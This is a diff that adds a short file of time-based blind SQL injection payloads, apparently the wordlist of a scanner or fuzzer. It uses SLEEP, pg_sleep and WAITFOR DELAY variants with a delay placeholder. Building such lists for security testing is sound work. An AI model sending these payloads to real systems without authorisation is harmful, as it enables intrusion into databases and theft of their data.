@@ -1,0 +1,7 @@
+' AND SLEEP(__DELAY__)-- -
+' OR SLEEP(__DELAY__)-- -
+1 AND SLEEP(__DELAY__)
+" AND SLEEP(__DELAY__)-- -
+' AND pg_sleep(__DELAY__)-- -
+'||pg_sleep(__DELAY__)||'
+'; WAITFOR DELAY '0:0:__DELAY__'-- -
